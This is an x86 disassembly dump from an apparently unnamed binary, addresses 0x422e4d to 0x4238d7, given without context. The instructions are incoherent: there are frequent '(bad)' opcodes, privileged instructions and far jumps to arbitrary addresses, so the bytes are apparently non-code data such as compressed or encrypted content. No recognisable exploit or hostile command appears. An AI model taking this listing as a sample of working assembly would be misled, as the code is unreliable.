  422e4d:	stos   BYTE PTR es:[edi],al
  422e4e:	lds    ebp,FWORD PTR [edx]
  422e50:	(bad)  
  422e51:	lock mov DWORD PTR [edi],eax
  422e54:	daa    
  422e55:	push   es
  422e56:	xchg   esi,eax
  422e57:	sbb    BYTE PTR [edi-0x48],al
  422e5a:	dec    ecx
  422e5b:	adc    eax,0x5b19b343
  422e60:	loop   0x422e5b
  422e62:	xor    ebp,0xa67af331
  422e68:	jecxz  0x422ded
  422e6a:	fdiv   DWORD PTR [ebp+0x51a94d77]
  422e70:	jg     0x422ef1
  422e72:	cld    
  422e73:	cmc    
  422e74:	data16 add al,0x9d
  422e77:	and    eax,DWORD PTR [ecx]
  422e79:	lods   al,BYTE PTR ds:[esi]
  422e7a:	add    edi,esi
  422e7c:	jmp    0xe167:0xe7c0f6a
  422e83:	jle    0x422e6b
  422e85:	and    eax,DWORD PTR [esi-0x41]
  422e88:	push   ds
  422e89:	inc    ebp
  422e8a:	sub    edi,DWORD PTR [edi]
  422e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e8d:	getsec 
  422e8f:	in     al,0xaa
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0x5b49
  422f02:	xchg   edi,eax
  422f03:	cmp    bh,ah
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x91000001,al
  422f0d:	adc    eax,0x780191ed
  422f12:	dec    esi
  422f13:	xchg   dl,ah
  422f15:	clc    
  422f16:	mov    dl,0x50
  422f18:	fsubr  DWORD PTR [ebx]
  422f1a:	push   ss
  422f1b:	jg     0x422f7d
  422f1d:	fsubp  st(3),st
  422f1f:	mov    ah,0xc7
  422f21:	jmp    DWORD PTR [eax+0x2a]
  422f24:	outs   dx,BYTE PTR ds:[esi]
  422f25:	sub    eax,0x66743dc9
  422f2a:	out    dx,eax
  422f2b:	pusha  
  422f2c:	push   ss
  422f2d:	dec    esp
  422f2e:	add    BYTE PTR [edi-0x476d2f19],0x96
  422f35:	push   eax
  422f36:	or     eax,0x1dca7f11
  422f3b:	test   ebp,ebx
  422f3d:	ins    DWORD PTR es:[edi],dx
  422f3e:	jg     0x422f87
  422f40:	stos   BYTE PTR es:[edi],al
  422f41:	nop
  422f42:	jnp    0x422f8a
  422f44:	xor    cl,dh
  422f46:	pop    edi
  422f47:	or     ch,dl
  422f49:	adc    eax,DWORD PTR [esi+0x12eabc1d]
  422f4f:	inc    edi
  422f50:	or     eax,0x29c4519f
  422f55:	sub    esi,DWORD PTR [ebp+0x1b]
  422f58:	loop   0x422f3a
  422f5a:	ins    DWORD PTR es:[edi],dx
  422f5b:	fild   QWORD PTR [ebx+0x3826f7f9]
  422f61:	add    esi,ebx
  422f63:	fild   DWORD PTR [ebx]
  422f65:	sub    esp,DWORD PTR [edi]
  422f67:	jne    0x422f8f
  422f69:	vmread DWORD PTR [edi],esp
  422f6c:	lock jle 0x422efc
  422f6f:	adc    al,0xcb
  422f71:	(bad)  
  422f72:	std    
  422f73:	and    esi,0x6d0c0e16
  422f79:	jmp    0x422f02
  422f7b:	ffree  st(0)
  422f7d:	mov    ebx,0x10948eb1
  422f82:	add    eax,0xceb2b1d
  422f87:	ss xchg ebp,eax
  422f89:	adc    bl,BYTE PTR [edx-0x7a6df50d]
  422f8f:	scas   eax,DWORD PTR es:[edi]
  422f90:	sti    
  422f91:	fwait
  422f92:	push   cs
  422f93:	dec    ecx
  422f94:	xor    DWORD PTR [eax+0x56],ecx
  422f97:	sahf   
  422f98:	sub    esp,DWORD PTR [edx-0x7a]
  422f9b:	test   al,0x34
  422f9d:	xlat   BYTE PTR ds:[ebx]
  422f9e:	and    al,0x2c
  422fa0:	fisttp QWORD PTR [ebx+ebx*8+0x6f]
  422fa4:	outs   dx,DWORD PTR ds:[esi]
  422fa5:	mov    edi,0x72628412
  422faa:	(bad)  
  422fac:	sub    eax,DWORD PTR [edx+0x4a278164]
  422fb2:	cdq    
  422fb3:	mov    ebx,0x60224707
  422fb8:	push   edx
  422fb9:	and    bh,BYTE PTR [ebx-0x69]
  422fbc:	pop    esp
  422fbd:	and    DWORD PTR [edi+edx*4],ebp
  422fc0:	add    dl,BYTE PTR [ebp-0x6f779325]
  422fc6:	fwait
  422fc7:	inc    eax
  422fc8:	xchg   esp,eax
  422fc9:	nop
  422fca:	sbb    esp,DWORD PTR [edx]
  422fcc:	cli    
  422fcd:	add    esp,DWORD PTR [ecx]
  422fcf:	es es nop
  422fd2:	into   
  422fd3:	out    0x66,al
  422fd5:	cmp    DWORD PTR [edi+eiz*1-0x44],ebx
  422fd9:	psrld  mm3,mm3
  422fdc:	add    cl,ch
  422fde:	cs cmc 
  422fe0:	mov    ebp,0x589fdf59
  422fe5:	fs push eax
  422fe7:	pusha  
  422fe8:	(bad)  
  422fe9:	js     0x422feb
  422feb:	in     al,0xb6
  422fed:	lahf   
  422fee:	and    BYTE PTR [edx+ecx*2+0x6ce27dcb],0x97
  422ff6:	int    0x54
  422ff8:	je     0x422fa4
  422ffa:	icebp  
  422ffb:	add    cl,dh
  422ffd:	test   BYTE PTR [esi+0x70],ah
  423000:	movaps xmm0,XMMWORD PTR [edi+ecx*1+0x24]
  423005:	inc    esp
  423006:	retf   
  423007:	aaa    
  423008:	ret    0x6bd3
  42300b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42300c:	fsubr  QWORD PTR [edi+0x5a8eab]
	...
  423072:	add    BYTE PTR [eax],al
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [edx+ebp*1+0x168fa4a],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0xc4000001,al
  42308d:	pop    es
  42308e:	add    BYTE PTR [edi],ch
  423090:	idiv   BYTE PTR [edi+0x4e8ea249]
  423096:	mov    ah,0x3c
  423098:	mov    edx,0x7ac27a1a
  42309d:	cmp    ah,0x14
  4230a0:	lock add ah,bh
  4230a3:	das    
  4230a4:	retf   0xd36b
  4230a7:	add    esp,esi
  4230a9:	cdq    
  4230aa:	sbb    DWORD PTR [eax+0x1400787d],esp
  4230b0:	push   esi
  4230b1:	mov    cl,BYTE PTR [ebx+ebx*8-0x788b2802]
  4230b8:	inc    ecx
  4230b9:	pusha  
  4230ba:	outs   dx,DWORD PTR ds:[esi]
  4230bb:	in     al,dx
  4230bc:	adc    DWORD PTR [edi-0x50],edx
  4230bf:	sub    BYTE PTR [ecx-0x63],dl
  4230c2:	pop    edi
  4230c3:	dec    esi
  4230c4:	out    dx,eax
  4230c5:	fsub   DWORD PTR [edx+edx*4+0x6ad497c2]
  4230cc:	mov    DWORD PTR [esi-0x6b],ebp
  4230cf:	dec    edi
  4230d0:	mov    ah,0x64
  4230d2:	fs test eax,0x1780848d
  4230d8:	mov    esi,DWORD PTR [ebp+0x40]
  4230db:	pop    edi
  4230dc:	pushf  
  4230dd:	bnd jmp 0x35ab5a57
  4230e3:	push   cs
  4230e4:	dec    edx
  4230e5:	sub    al,BYTE PTR [ecx]
  4230e7:	and    esp,DWORD PTR ds:0xe69f45be
  4230ed:	std    
  4230ee:	arpl   WORD PTR [ebp-0x68],cx
  4230f1:	mov    esi,0xd25fa85d
  4230f6:	pop    edi
  4230f7:	(bad)  
  4230f8:	(bad)  
  4230f9:	mov    ch,0xf4
  4230fb:	in     eax,0x4b
  4230fd:	ret    0xc7d9
  423100:	pop    ds
  423101:	sbb    al,0x4d
  423103:	rol    DWORD PTR [ecx+0x38],cl
  423106:	ja     0x4230fc
  423108:	(bad)  
  423109:	adc    BYTE PTR [edx],ah
  42310b:	lods   al,BYTE PTR ds:[esi]
  42310c:	fmul   QWORD PTR [edx+0x62f31a99]
  423112:	sub    bh,BYTE PTR [esi+ecx*4-0x27]
  423116:	fldcw  WORD PTR [esi]
  423118:	add    edx,edx
  42311a:	sahf   
  42311b:	jmp    0x7d2a:0x472a8a16
  423122:	cmp    BYTE PTR [eax-0x7d0167b],cl
  423128:	imul   edi,DWORD PTR [esi+0x4476fa67],0xaf802c4a
  423132:	out    dx,ax
  423134:	and    al,0xd8
  423136:	imul   edi,DWORD PTR [esi+0x38],0x7
  42313a:	jp     0x4231a5
  42313c:	and    BYTE PTR [esi+edx*1+0x40b3c3f2],ah
  423143:	push   eax
  423144:	daa    
  423145:	in     eax,dx
  423146:	js     0x42310b
  423148:	gs bswap ecx
  42314b:	sahf   
  42314c:	(bad)  
  42314d:	hlt    
  42314e:	pop    esi
  42314f:	(bad)  
  423150:	dec    esi
  423151:	adc    al,0xe7
  423153:	dec    edi
  423154:	inc    bl
  423156:	(bad)  
  423157:	rol    BYTE PTR [ecx-0x47],1
  42315a:	inc    esp
  42315b:	mov    eax,ds:0x81b7053b
  423160:	or     DWORD PTR [edx+0x10],0xed4275c4
  423167:	sbb    ebx,DWORD PTR [ecx]
  423169:	or     edi,DWORD PTR [edx+0x52d38884]
  42316f:	mov    cl,0xf9
  423171:	fiadd  DWORD PTR [ecx-0x2c23a5f5]
  423177:	dec    eax
  423178:	mov    esp,esp
  42317a:	lds    ebp,FWORD PTR [edi-0x7481dca7]
  423180:	mov    ebx,DWORD PTR [esi]
  423182:	dec    ebp
  423183:	sub    eax,0x5b39d1af
  423188:	dec    ebp
  423189:	aam    0xcf
  42318b:	and    al,0xd0
  42318d:	push   ebx
  42318e:	fst    QWORD PTR [ebx]
  423190:	leave  
	...
  4231f1:	add    BYTE PTR [eax],al
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x6ad8f161],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x80000001,al
  42320d:	ret    0xc3f0
  423210:	or     ah,BYTE PTR [edi-0x7f]
  423213:	es (bad) 
  423215:	sub    eax,DWORD PTR ds:0xe9de07a9
  42321b:	xchg   DWORD PTR [edx+0x1b462b2c],eax
  423221:	int    0x16
  423223:	pop    edx
  423224:	push   edi
  423225:	mov    bh,BYTE PTR [ebx-0x15f7f4fe]
  42322b:	inc    ebp
  42322c:	jbe    0x4231f0
  42322e:	lahf   
  42322f:	les    eax,FWORD PTR [ecx]
  423231:	setb   bh
  423234:	xchg   ebp,eax
  423235:	fild   DWORD PTR [edi]
  423237:	arpl   WORD PTR [esi+0x2d9d4b41],dx
  42323d:	inc    esi
  42323e:	mov    bl,0xac
  423240:	push   edx
  423241:	mov    dl,0x90
  423243:	sub    al,0x93
  423245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423246:	jge    0x423205
  423248:	sbb    bl,BYTE PTR [edi+0x3e]
  42324b:	inc    ebx
  42324c:	call   0xb826bfd1
  423251:	mov    ah,0x60
  423253:	sub    eax,0x93c1a419
  423258:	mov    bl,0xf
  42325a:	or     DWORD PTR [esi],0x985c96de
  423260:	adc    dl,BYTE PTR [ebp+0x20c77dd2]
  423266:	adc    BYTE PTR [eax],0x2
  423269:	fnstcw WORD PTR [esi-0x3f]
  42326c:	dec    esi
  42326d:	lock inc esp
  42326f:	jge    0x423262
  423271:	ins    BYTE PTR es:[edi],dx
  423272:	jecxz  0x423225
  423274:	mov    eax,0x4180caa6
  423279:	into   
  42327a:	enter  0x1113,0xd6
  42327e:	jle    0x423269
  423280:	pushf  
  423281:	das    
  423282:	pop    ecx
  423283:	mov    es,WORD PTR [ebx+edx*2]
  423286:	dec    esi
  423287:	jns    0x4232e6
  423289:	mov    cl,0xf9
  42328b:	ret    0x6ed0
  42328e:	adc    edx,DWORD PTR [esi+eax*2-0x292b26ba]
  423295:	sbb    al,0x25
  423297:	jns    0x42321b
  423299:	imul   eax,DWORD PTR [ecx],0x7a
  42329c:	sub    al,0x30
  42329e:	mov    bh,BYTE PTR [edi]
  4232a0:	mov    ch,0x97
  4232a2:	cmp    BYTE PTR [edi+eax*8+0x4a],0x60
  4232a7:	dec    esi
  4232a8:	push   esi
  4232a9:	frstor [ebp+ebp*1-0x62]
  4232ad:	adc    ebp,DWORD PTR [esi+0x2d]
  4232b0:	mov    bl,0xe9
  4232b2:	(bad)  
  4232b3:	sub    al,0x5e
  4232b5:	mov    ds:0x73c03d2a,eax
  4232ba:	and    al,0x78
  4232bc:	enter  0x7cda,0xce
  4232c0:	(bad)  
  4232c1:	mov    esi,?
  4232c3:	(bad)  
  4232c5:	fs (bad) 
  4232c7:	push   eax
  4232c8:	imul   edi,ebx,0xffffff9f
  4232cb:	jmp    DWORD PTR [edx+0x72]
  4232ce:	call   0x47b7:0x32f06038
  4232d5:	xchg   esp,eax
  4232d6:	sbb    cl,BYTE PTR [ebx-0x1f]
  4232d9:	int    0xc
  4232db:	pop    edx
  4232dc:	dec    eax
  4232dd:	xchg   ebp,eax
  4232de:	mov    edi,0x4616b4b1
  4232e3:	xor    dl,ch
  4232e5:	btc    DWORD PTR [ebx-0x69b90e87],edi
  4232ec:	xor    BYTE PTR [eax+0xf],0xc7
  4232f0:	fsub   st,st(3)
  4232f2:	lods   al,BYTE PTR ds:[esi]
  4232f3:	mov    DWORD PTR [ebx],esp
  4232f5:	mov    WORD PTR [esi-0x4e],ds
  4232f8:	push   eax
  4232f9:	aam    0xb0
  4232fb:	jle    0x42330c
  4232fd:	sbb    bh,BYTE PTR [ecx+0x49]
  423300:	mov    WORD PTR [eax],es
  423302:	inc    esp
  423303:	and    al,0x16
  423305:	xchg   DWORD PTR [ebx-0x51e23eca],ecx
  42330b:	mov    WORD PTR [ebp+ecx*1+0x7d38ff],ss
	...
  423372:	add    BYTE PTR [eax],al
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x2a8c0f44
  423382:	adc    eax,0x1780bf2
  423387:	add    BYTE PTR ds:0x3d000001,al
  42338d:	outs   dx,BYTE PTR ds:[esi]
  42338e:	jno    0x423352
  423390:	dec    esi
  423391:	mov    ss,esp
  423393:	pop    ebp
  423394:	ins    BYTE PTR es:[edi],dx
  423395:	shr    dh,cl
  423397:	pushf  
  423398:	jnp    0x4233da
  42339a:	arpl   cx,si
  42339c:	mov    ebp,0x1ea47ab5
  4233a1:	ror    edx,cl
  4233a3:	add    BYTE PTR [esi],ch
  4233a5:	add    al,0x16
  4233a7:	and    ecx,ebp
  4233a9:	xor    BYTE PTR [edi-0x3],dl
  4233ac:	sub    eax,ebx
  4233ae:	shr    dl,0x8d
  4233b1:	mov    bh,0x21
  4233b3:	xor    ebp,DWORD PTR ds:0xce37b521
  4233b9:	hlt    
  4233ba:	mov    bh,0xd5
  4233bc:	dec    ecx
  4233bd:	push   ebp
  4233be:	retf   0x4005
  4233c1:	test   al,0x42
  4233c3:	shl    ebp,1
  4233c5:	xchg   esi,eax
  4233c6:	icebp  
  4233c7:	lock call 0x446d2313
  4233cd:	jae    0x423430
  4233cf:	pop    edx
  4233d0:	arpl   WORD PTR [edi],bx
  4233d2:	mov    ds:0x751945c4,al
  4233d7:	or     ebx,eax
  4233d9:	xor    al,0x4b
  4233db:	in     eax,0xf3
  4233dd:	hlt    
  4233de:	imul   edx,eax,0xffffff9a
  4233e1:	aam    0x35
  4233e3:	js     0x42343f
  4233e5:	nop
  4233e6:	xor    bl,BYTE PTR [ebx-0x5bc2d23f]
  4233ec:	mov    al,ds:0x19f21397
  4233f1:	ins    BYTE PTR es:[edi],dx
  4233f2:	push   ecx
  4233f3:	paddsb mm1,QWORD PTR [edx]
  4233f6:	ins    BYTE PTR es:[edi],dx
  4233f7:	ins    BYTE PTR es:[edi],dx
  4233f8:	lahf   
  4233f9:	mov    ah,0xb4
  4233fb:	(bad)  
  4233fc:	adc    BYTE PTR [ebx],bh
  4233fe:	(bad)  
  423400:	push   esi
  423401:	in     eax,dx
  423402:	jmp    0x334b:0xff325952
  423409:	mov    esi,0xccf88b2a
  42340e:	mov    cs,WORD PTR [ecx+0x37c6be5a]
  423414:	inc    edi
  423415:	stc    
  423416:	inc    edx
  423417:	jmp    0xe97af492
  42341c:	pop    ebp
  42341d:	mov    cl,0x50
  42341f:	fs out dx,eax
  423421:	stos   BYTE PTR es:[edi],al
  423422:	jge    0x423401
  423424:	jb     0x4233ff
  423426:	mov    bl,0xa
  423428:	cmp    eax,0x372b9df4
  42342d:	pop    esp
  42342e:	and    BYTE PTR [esi],bh
  423430:	dec    eax
  423431:	loop   0x4233df
  423433:	mov    BYTE PTR ds:0xd8fd70ca,al
  423439:	sbb    eax,0xe60529fa
  42343e:	fisubr DWORD PTR [edi]
  423440:	sbb    eax,0x8b7009b0
  423445:	mov    ah,0xa4
  423447:	add    ah,BYTE PTR [ebx]
  423449:	ss pop esi
  42344b:	add    edi,DWORD PTR [eax-0x2fbb94dc]
  423451:	call   0x17fe0f56
  423456:	mov    ah,0x18
  423458:	xchg   edx,eax
  423459:	int    0x2d
  42345b:	sbb    edx,edi
  42345d:	add    dl,BYTE PTR [eax]
  42345f:	inc    ebp
  423460:	dec    ebp
  423461:	jp     0x4234b7
  423463:	in     al,dx
  423464:	adc    cl,ah
  423466:	call   0x5f84:0x64916123
  42346d:	out    dx,al
  42346e:	shl    DWORD PTR [ebp-0x45006852],cl
  423474:	call   DWORD PTR [edx+0x3e]
  423477:	inc    edi
  423478:	(bad)  
  42347a:	xor    ebx,ecx
  42347c:	add    bh,BYTE PTR [ecx-0x66c75e4b]
  423482:	cs jle 0x42345a
  423485:	add    cl,BYTE PTR [ebx]
  423487:	aas    
  423488:	push   ebp
  423489:	sar    BYTE PTR [ecx],1
  42348b:	mov    dh,0xd8
  42348d:	pop    esp
  42348e:	dec    ecx
  42348f:	jnp    0x423448
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0x551f:0xadf467bf
  423501:	sub    al,0xe2
  423503:	call   0x105:0x17910
  42350a:	add    BYTE PTR [eax],al
  42350c:	inc    esp
  42350d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42350e:	push   edi
  42350f:	mov    edi,0xc46e48fc
  423514:	retf   
  423515:	adc    eax,DWORD PTR [ebp+0x67adfacb]
  42351b:	push   ds
  42351c:	ss inc esp
  42351e:	dec    edx
  42351f:	pop    esp
  423520:	and    ebp,DWORD PTR [esi-0x42]
  423523:	sahf   
  423524:	xchg   edi,eax
  423525:	cli    
  423526:	pushf  
  423527:	add    eax,DWORD PTR [eax+0x6b940697]
  42352d:	push   edi
  42352e:	aad    0xb8
  423530:	scas   eax,DWORD PTR es:[edi]
  423531:	fisubr DWORD PTR [edx+edi*1+0x5c]
  423535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423536:	sub    bl,BYTE PTR [ebp-0x1f]
  423539:	cmp    ebp,ecx
  42353b:	xchg   edi,eax
  42353c:	cmp    eax,0xcc68a635
  423541:	fisubr DWORD PTR [ecx-0x6d51712e]
  423547:	pop    es
  423548:	push   ecx
  423549:	inc    ecx
  42354a:	(bad)  [esi+0x77]
  42354d:	cmc    
  42354e:	sub    al,0x7e
  423550:	popa   
  423551:	xor    ch,ch
  423553:	das    
  423554:	in     eax,0x12
  423556:	add    eax,0x4886e18b
  42355b:	add    eax,ebx
  42355d:	inc    eax
  42355e:	sub    BYTE PTR [eax-0x69399ea3],al
  423564:	mov    esp,0xa92c36f9
  423569:	jae    0x4235bb
  42356b:	pop    es
  42356c:	(bad)  
  42356d:	(bad)  
  42356e:	pop    ebx
  42356f:	mov    edx,0xba0291a7
  423574:	(bad)  
  423575:	push   esp
  423576:	popf   
  423577:	pop    ss
  423578:	cs bnd js 0x42358e
  42357c:	cmc    
  42357d:	inc    ecx
  42357e:	push   ecx
  42357f:	mov    BYTE PTR [esi-0x54],ah
  423582:	jg     0x4235aa
  423584:	mov    ebp,0x38ea6ec3
  423589:	add    eax,0xa1e787d6
  42358e:	cwde   
  42358f:	cmp    al,0xc7
  423591:	popa   
  423592:	jne    0x42354d
  423594:	shl    BYTE PTR [edx],0xe1
  423597:	ror    BYTE PTR [ebx-0x3ab87f9a],cl
  42359d:	xchg   ecx,eax
  42359e:	data16 jmp 0x4235b6
  4235a1:	in     eax,dx
  4235a2:	cdq    
  4235a3:	cwde   
  4235a4:	inc    eax
  4235a5:	mov    ah,0x98
  4235a7:	xchg   esi,eax
  4235a8:	push   ds
  4235a9:	repnz push esi
  4235ab:	pop    eax
  4235ac:	sub    eax,0xadcbf3d1
  4235b1:	sbb    al,0x25
  4235b3:	add    BYTE PTR [ebx],al
  4235b5:	ds ds (bad) 
  4235b8:	retf   0x3365
  4235bb:	retf   0xea7d
  4235be:	mov    al,0xc6
  4235c0:	jecxz  0x423601
  4235c2:	or     ebp,eax
  4235c4:	cmp    al,0x14
  4235c6:	mov    eax,0xc644f77e
  4235cb:	cmp    DWORD PTR [eax],0xf506049
  4235d1:	mov    ds:0x75fc8784,al
  4235d6:	mov    esp,0x9dd8c640
  4235db:	add    BYTE PTR [ebp-0x70],0x77
  4235df:	pop    ebx
  4235e0:	xlat   BYTE PTR ds:[ebx]
  4235e1:	sar    BYTE PTR [edx+ecx*1+0x23],cl
  4235e5:	lds    edx,FWORD PTR [eax+0x4]
  4235e8:	push   cs
  4235e9:	dec    esi
  4235ea:	pop    ecx
  4235eb:	scas   eax,DWORD PTR es:[edi]
  4235ec:	xchg   DWORD PTR [esi-0x3c1cba61],ecx
  4235f2:	mov    cl,0xa5
  4235f4:	sub    DWORD PTR [edi+eax*2+0x5e],ebx
  4235f8:	or     BYTE PTR [eax-0x10],dh
  4235fb:	xchg   ecx,eax
  4235fc:	sbb    BYTE PTR [ebp-0x34],dl
  4235ff:	or     ecx,DWORD PTR [ebp-0xa]
  423602:	fwait
  423603:	leave  
  423604:	add    DWORD PTR [eax+0x40e44292],edx
  42360a:	and    DWORD PTR [edx],edx
  42360c:	pusha  
  42360d:	dec    ebp
  42360e:	ds (bad) 
  423610:	xchg   ebp,eax
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x4d472413
  423683:	dec    ebp
  423684:	adc    eax,0x500017a
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    bh,ah
  42368d:	repnz pop ecx
  42368f:	or     ecx,DWORD PTR [ecx+eax*8+0x6b884c1e]
  423696:	jecxz  0x423627
  423698:	rol    DWORD PTR [esi+0x20],0x99
  42369c:	cmp    BYTE PTR [esi-0x5981cd51],bh
  4236a2:	xchg   ebx,eax
  4236a3:	pop    ebx
  4236a4:	jl     0x4236e5
  4236a6:	loopne 0x4236c9
  4236a8:	sbb    dl,ch
  4236aa:	mov    bh,0x39
  4236ac:	rcl    esp,cl
  4236ae:	cld    
  4236af:	mov    esp,0xd96856c8
  4236b4:	leave  
  4236b5:	retf   
  4236b6:	shl    BYTE PTR [edi-0x5],cl
  4236b9:	out    dx,eax
  4236ba:	(bad)
  4236bd:	sub    al,0x44
  4236bf:	jnp    0x42364f
  4236c1:	inc    ecx
  4236c2:	jbe    0x4236bb
  4236c4:	adc    ebp,ebx
  4236c6:	inc    esp
  4236c7:	cmc    
  4236c8:	sub    ebp,esp
  4236ca:	mov    esi,0xd8c75737
  4236cf:	push   0x97f919fa
  4236d4:	lods   al,BYTE PTR ds:[esi]
  4236d5:	push   es
  4236d6:	add    BYTE PTR [edi-0x7edf4b92],bl
  4236dc:	dec    ebp
  4236dd:	fcom   DWORD PTR [ecx]
  4236df:	sbb    ah,0x2f
  4236e2:	xchg   esi,eax
  4236e3:	sub    cl,bl
  4236e5:	stos   DWORD PTR es:[edi],eax
  4236e6:	je     0x4236b1
  4236e8:	lock add al,0xc7
  4236eb:	out    dx,al
  4236ec:	mov    al,0x68
  4236ee:	lods   al,BYTE PTR ds:[esi]
  4236ef:	cmc    
  4236f0:	jle    0x42376b
  4236f2:	jae    0x4236f3
  4236f4:	scas   eax,DWORD PTR es:[edi]
  4236f5:	jmp    0x8d4f:0x8aefbb2b
  4236fc:	mov    eax,ds:0x7a0c9d34
  423701:	or     BYTE PTR [edi-0x4b6f72e7],dl
  423707:	sub    dh,BYTE PTR [ebp-0x75]
  42370a:	or     al,0x3a
  42370c:	rcl    eax,cl
  42370e:	das    
  42370f:	xchg   edi,eax
  423710:	fcom   DWORD PTR [edx+0x3612c9ec]
  423716:	cld    
  423717:	or     ah,BYTE PTR [edi-0x3f]
  42371a:	sbb    eax,0xf205d59
  42371f:	dec    edx
  423720:	sar    dl,cl
  423722:	inc    eax
  423723:	mov    bh,0x1a
  423725:	or     DWORD PTR [ebx],0xffffffd9
  423728:	xor    ebp,DWORD PTR [esi-0x76]
  42372b:	pop    esp
  42372c:	retf   0xa34d
  42372f:	ja     0x423771
  423731:	cmp    dl,BYTE PTR [ebp+0x6bd837e3]
  423737:	pop    ecx
  423738:	pop    ss
  423739:	fnstcw WORD PTR [esp+esi*4+0x6ee2ff99]
  423740:	aaa    
  423741:	stos   BYTE PTR es:[edi],al
  423742:	mov    esp,0xefe37737
  423747:	sbb    BYTE PTR [edi+edx*1],0xc7
  42374b:	push   ebx
  42374c:	clc    
  42374d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42374e:	push   ds
  42374f:	ret    
  423750:	or     BYTE PTR [ecx-0x72],al
  423753:	imul   edi,DWORD PTR [eax+edx*4-0x12],0x196a63d9
  42375b:	push   edx
  42375c:	sub    edx,DWORD PTR [ecx+0x65]
  42375f:	jne    0x4237d6
  423761:	scas   al,BYTE PTR es:[edi]
  423762:	neg    BYTE PTR [ebp+0x2ce916c2]
  423768:	mov    edi,0x31d161bd
  42376d:	xor    BYTE PTR [ecx+0x99d810f],bl
  423773:	cmp    ecx,DWORD PTR [ebx]
  423775:	in     al,0xf8
  423777:	rcl    DWORD PTR [ebx],1
  423779:	xor    BYTE PTR [edx+0x5a4b36fc],bl
  42377f:	cmp    esi,DWORD PTR [ecx-0x36]
  423782:	cdq    
  423783:	ret    0x3af1
  423786:	and    al,0xea
  423788:	mov    dl,0xd1
  42378a:	pop    ss
  42378b:	ror    BYTE PTR [eax],1
  42378d:	loope  0x423725
  42378f:	aad    0x46
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0xd3378efc
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x82000001
  42380d:	std    
  42380e:	icebp  
  42380f:	pop    ecx
  423810:	dec    ebx
  423811:	xchg   edx,eax
  423812:	push   cs
  423813:	cmp    eax,0x392c47bb
  423818:	xchg   edi,eax
  423819:	or     cl,BYTE PTR [edi+0x1c]
  42381c:	daa    
  42381d:	push   0xffffffcd
  42381f:	xchg   DWORD PTR ds:[eax+0x204a9f2f],edi
  423826:	pop    ebp
  423827:	pop    ds
  423828:	test   eax,0xbbb8727e
  42382d:	or     al,0xc2
  42382f:	mov    ebp,0x8ac21bae
  423834:	or     eax,0x68b3cc13
  423839:	(bad)  
  42383b:	and    al,BYTE PTR [ecx-0x4d10c60b]
  423841:	inc    ebx
  423843:	scas   eax,DWORD PTR es:[edi]
  423844:	jae    0x423821
  423846:	aam    0x6
  423848:	or     DWORD PTR [esi-0x42],esi
  42384b:	rol    BYTE PTR ds:0xe3b5c559,1
  423851:	push   cs
  423852:	push   0x32439198
  423857:	sub    eax,0xc2bd552a
  42385c:	or     ch,bl
  42385e:	and    bl,ch
  423860:	dec    edi
  423861:	ror    BYTE PTR [ebx-0x73bda004],cl
  423867:	sbb    edx,DWORD PTR [ecx+edx*2+0x2f]
  42386b:	adc    eax,0x1ad5b113
  423870:	add    al,0x5
  423872:	mov    dh,0x55
  423874:	mov    eax,0x40eac013
  423879:	aad    0x75
  42387b:	jne    0x423837
  42387d:	xchg   edi,eax
  42387e:	xor    al,0x5
  423880:	sub    cl,dl
  423882:	fs call 0xd2d4134f
  423888:	pop    ebx
  423889:	pushf  
  42388a:	mov    al,ds:0xdab9aa9c
  42388f:	loope  0x4238a7
  423891:	inc    esp
  423892:	mov    bh,BYTE PTR [ecx-0x1]
  423895:	pusha  
  423896:	dec    eax
  423897:	test   DWORD PTR [edx],edx
  423899:	iret   
  42389a:	pop    es
  42389b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42389c:	iret   
  42389d:	cmp    BYTE PTR [edx+0x6ab1bfb],ch
  4238a3:	ret    0xd156
  4238a6:	test   DWORD PTR [esi],eax
  4238a8:	loop   0x42390c
  4238aa:	push   0xffffffd6
  4238ac:	add    al,0x47
  4238ae:	dec    edx
  4238af:	push   ecx
  4238b0:	fucomip st,st(3)
  4238b2:	and    bl,BYTE PTR [ebp-0x335e6357]
  4238b8:	imul   edx,DWORD PTR [edx+0x3a6b029f],0x43
  4238bf:	(bad)  
  4238c0:	arpl   WORD PTR [esi+ecx*8-0x3b],sp
  4238c4:	js     0x423893
  4238c6:	retf   
  4238c7:	sub    eax,0x2d7f4436
  4238cc:	cmp    al,0xca
  4238ce:	outs   dx,BYTE PTR ds:[esi]
  4238cf:	out    0x85,eax
  4238d1:	arpl   WORD PTR [esi-0x3feef89],dx
  4238d7:	(bad)  
